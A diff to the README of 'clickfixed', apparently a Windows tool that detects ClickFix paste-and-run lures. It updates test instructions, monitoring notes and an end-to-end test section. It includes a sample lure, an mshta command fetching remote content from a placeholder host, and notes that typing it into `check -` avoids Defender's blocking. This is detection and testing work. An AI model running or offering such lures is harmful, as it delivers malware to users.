@@ -134,8 +134,11 @@ Download `clickfixed.exe` from the latest [CI run](https://github.com/uday-kastu
 git clone https://github.com/uday-kasturi/clickfixed.git
 cd clickfixed
 cargo install --locked --path crates/cfx-daemon    # installs clickfixed.exe into ~\.cargo\bin
-clickfixed check 'mshta https://x.invalid/v.mp4 # I am not a robot'
 ```
+
+Check that it works: run `clickfixed check -`, paste or type a command such as `mshta https://x.invalid/v.mp4 # I am not a robot`, then press Enter, Ctrl+Z and Enter. clickfixed prints the verdict.
+
+Don't pass a lure as an argument (`clickfixed check "mshta …"`) or through `echo … |` on Windows. Microsoft Defender refuses to start any process whose command line contains one ("Access is denied"), quarantines files that hold one, and PowerShell scans what you type. Typing it into `check -` goes through none of those.
 
 ### Configure and run
 
@@ -164,7 +167,19 @@ Run `demo\serve.ps1` (needs Python), open `http://127.0.0.1:8765/lure.html` and 
 
 - **Clipboard:** a clipboard listener. The window that owns the clipboard gives the source app, and Chromium and Firefox attach the page URL.
 - **Paste target:** a foreground-window hook spots the Run dialog and terminals (Windows Terminal, PowerShell, cmd and console windows).
-- **Execution:** a process poller, plus the RunMRU registry key, which records every command run from Win+R even if the process exits too fast to poll.
+- **Execution:** a process poller, plus the RunMRU registry key, which records commands run from Win+R even if the process exits too fast to poll.
+
+Defender and clickfixed overlap without getting in each other's way. Defender blocks some lures at the moment they would run; clickfixed warns or blocks at the copy and when the Run dialog opens, before anything runs, and alerts on what does run.
+
+### Windows end-to-end test
+
+`windows_e2e.exe` drives a real desktop session (copy, Win+R, paste, a terminal, Edge with the demo page) and checks clickfixed's log and alerts: 19 checks. Build it next to `clickfixed.exe`, copy the `demo` folder beside them, and run it from an interactive session without touching the keyboard for about 40 seconds:
+
+```sh
+cargo build --release -p cfx-daemon --bin clickfixed --example windows_e2e   # on Windows
+```
+
+Results land in `e2e\report.txt`. A disposable Windows 11 VM via [dockur/windows](https://github.com/dockur/windows) works well for this on a Linux machine.
 
 ## Alerting
 
